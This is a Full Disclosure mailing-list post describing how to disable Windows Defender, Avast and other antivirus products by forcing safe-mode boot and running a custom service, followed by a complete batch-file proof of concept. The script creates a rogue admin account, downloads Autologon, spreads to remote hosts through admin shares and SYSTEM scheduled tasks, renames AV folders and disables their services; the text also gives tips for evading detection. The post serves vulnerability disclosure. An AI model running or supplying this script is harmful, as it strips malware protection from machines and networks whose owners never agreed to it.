@@ -1,0 +1,122 @@
+
+Date: Sun, 6 Dec 2020 21:00:31 -0500
+From: Roberto Franceschetti <roberto@...sat.com>
+To: fulldisclosure@...lists.org
+Subject: [FD] Disable Windows Defender and most other 3rd party antiviruses
+
+Windows Defender and most other antivirus applications can be disabled by booting into safe mode and renaming their application directories before their AV services are started in Windows. The renaming of the directories can be performed by creating a Windows NT Service that is allowed to start in Safe Mode. While Windows stops most non-Windows, non-critical services from starting when booting in Safe mode, I was able to make sure that my service is started by adding it to:
+HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\[service name]
+
+I have successfully tested POCs on fully patched Windows 10 and Windows Server 2016 machines. In all cases I was able to disable the following antivirus products, even if they each had their flavor of password/tamper protection enabled:
+Windows Defender
+Avast
+Kaspersky
+F-Secure
+Bitdefender
+[one more product goes here, but as that vendor recognized the issue and has worked on a fix I will not mention it]
+
+The POC consists of a single .bat file that can be used to either disable the antivirus on the local machine, or one running on a remote endpoint.
+
+Disclosure: Local admin rights are needed on the victim's PC (very common for home users). For a remote exploit, this POC additionally requires the  attacker to have access to the remote C$ share and to be able to schedule tasks remotely. Note that this however is a common scenario for IT tech support staff - if just one of them is tricked into executing the exploit, this could cause all AV protection on all Windows endpoints in the corporate network to be disabled.
+
+A sample exploit to disable both Windows Defender and Avast can be found below. The code is self-explanatory. On:
+https://logsat.com/WindowsAVBypass/
+
+you can find more details as to why I'm releasing this publicly, along with an additional POC sample that is used to disable Bitdefender. Bitdefender detects the original POC as malicious, but all that is needed to bypass that AV is to split each command in a separate scheduled task. Please note that some A/V might now detect this specific code as malicious, but what matters is the methodology that allows to disable the AVs - the steps can be performed in several different ways to go undetected.
+
+A screencast showing the POC remotely disabling Avast and Windows Defender is at: https://youtu.be/VE3gwXt6uWg
+
+Roberto Franceschetti
+LogSat Software
+
+
+============= Avast-DisableAV-Remote.bat ================================
+
+REM - Author: Roberto Franceschetti
+REM - Usage - to disable AV on local machine: C:\>Avast-DisableAV-Remote.bat
+REM - Usage - to disable AV on remote machine: C:\>Avast-DisableAV-Remote.bat TargetComputerName (must be a hostname - IP won't work)
+
+IF NOT [%1] == [] (GOTO Remote) ELSE (GOTO Local)
+
+:Remote
+rem - we are exploiting a remote computer - copy script to victim and schedule task to execute it
+COPY "%~dp0Avast-DisableAV-Remote.bat" \\%1\C$\windows\temp\Avast-DisableAV-Remote.bat
+powershell -command "& {$time = [DateTime]::Now.AddMinutes(1);$hourMinute=$time.ToString('HH:mm');SchTasks.exe /Create /s %1 /SC ONCE /TN 'DisableAvast' /TR 'C:\Windows\temp\Avast-DisableAV-Remote.bat' /ST $hourMinute /F /RU 'SYSTEM' /RL HIGHEST }"
+GOTO :eof
+
+:Local
+rem - We are running .bat locally - run the exploit
+rem - create local admin account used to autologin on first safe boot
+net user AvastBounty "Avast123" /ADD
+net localgroup administrators AvastBounty /add
+
+rem - add autologin registry entries for next reboot
+powershell -command "& { iwr https://live.sysinternals.com/Autologon.exe -OutFile c:\windows\temp\Autologon.exe }"
+c:\windows\temp\Autologon.exe -accepteula AvastBounty . Avast123
+
+rem - Now configure the next reboot in safe mode and autologin
+bcdedit /set {default} safeboot minimal
+
+rem - create the batch file executed by the DisableAvast service after the safe reboot
+rem - will rename ProgramFiles\Avast folders/filesystem drivers, disable WinDefender
+rem - will remove the safebot/autologon entries and reboot
+
+@echo off
+echo cd c:\windows\temp > c:\windows\temp\DisableAvastAV.bat
+echo ren "C:\Program Files\Avast Software" "Avast Software Disabled" >> c:\windows\temp\DisableAvastAV.bat
+echo ren "C:\Program Files\Windows Defender" "Windows Defender Disabled" >> c:\windows\temp\DisableAvastAV.bat
+echo ren "C:\Program Files\Windows Defender Advanced Threat Protection" "Windows Defender Advanced Threat Protection Disabled" >> c:\windows\temp\DisableAvastAV.bat
+echo ren "C:\Program Files (x86)\Windows Defender" "Windows Defender Disabled" >> c:\windows\temp\DisableAvastAV.bat
+echo ren "C:\ProgramData\Avast Software" "Avast Software Disabled" >> c:\windows\temp\DisableAvastAV.bat
+
+echo sc config "avast! Antivirus" start=disabled >> c:\windows\temp\DisableAvastAV.bat
+echo sc config "avast! Tools" start=disabled >> c:\windows\temp\DisableAvastAV.bat
+echo sc config "AvastWscReporter" start=disabled >> c:\windows\temp\DisableAvastAV.bat
+echo sc config "aswbIDSAgent" start=disabled >> c:\windows\temp\DisableAvastAV.bat
+echo sc config WinDefend start=disabled >> c:\windows\temp\DisableAvastAV.bat
+
+echo timeout /t 10 >> c:\windows\temp\DisableAvastAV.bat
+echo net stop SAVService >> c:\windows\temp\DisableAvastAV.bat
+echo net stop hmpalertsvc >> c:\windows\temp\DisableAvastAV.bat
+echo timeout /t 10 >> c:\windows\temp\DisableAvastAV.bat
+echo ren "C:\Program Files\Avast" Avast_Disabled >> c:\windows\temp\DisableAvastAV.bat
+
+echo reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /f /t REG_SZ /d "0" >> c:\windows\temp\DisableAvastAV.bat
+echo bcdedit /deletevalue {default} safeboot >> c:\windows\temp\DisableAvastAV.bat
+echo sc delete DisableAvast >> c:\windows\temp\DisableAvastAV.bat
+rem - echo pause >> c:\windows\temp\DisableAvastAV.bat
+echo shutdown /r /f /t 0 >> c:\windows\temp\DisableAvastAV.bat
+
+rem - now create the Powershell script that will create a "DisableAvastAV.exe" that will simply execute the DisableAvastAV.bat batch file above:
+rem - this is done as Windows 10 won't allow a service to run a .bat file, but a .exe will however run once just fine even if the service fails to start
+
+echo $source = @^" > c:\windows\temp\CreateService.ps1
+echo   using System; >> c:\windows\temp\CreateService.ps1
+echo   class Hello { >> c:\windows\temp\CreateService.ps1
+echo     static void Main() { >> c:\windows\temp\CreateService.ps1
+echo      System.Diagnostics.Process.Start(^"C:\\Windows\\Temp\\DisableAvastAV.bat^"); >> c:\windows\temp\CreateService.ps1
+echo     } >> c:\windows\temp\CreateService.ps1
+echo   } >> c:\windows\temp\CreateService.ps1
+echo ^"@ >> c:\windows\temp\CreateService.ps1
+echo Add-Type -TypeDefinition $source -Language CSharp -OutputAssembly ^"C:\Windows\Temp\DisableAvastAV.exe^" >> c:\windows\temp\CreateService.ps1
+
+@echo on
+
+rem - now execute the powershell script to create the DisableAvastAV.exe file and install it as a service:
+powershell set-executionpolicy -executionpolicy bypass
+powershell c:\windows\temp\CreateService.ps1
+sc create DisableAvast binpath="c:\windows\temp\DisableAvastAV.exe" start=auto
+
+rem - this entry will allow the DisableAvast service to run in Safeboot as well, otherwise it won't start:
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\DisableAvast /f /t REG_SZ /d "service"
+
+rem - now reboot... Safe mode will be activated and the DisableAvastAV.exe service will run, calling the DisableAvastAV.bat script, renaming the Avast folders no longer protected by Tamper Protection
+rem - pause
+shutdown /r /f /t 0
+
+=============================================
+
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: http://seclists.org/fulldisclosure/
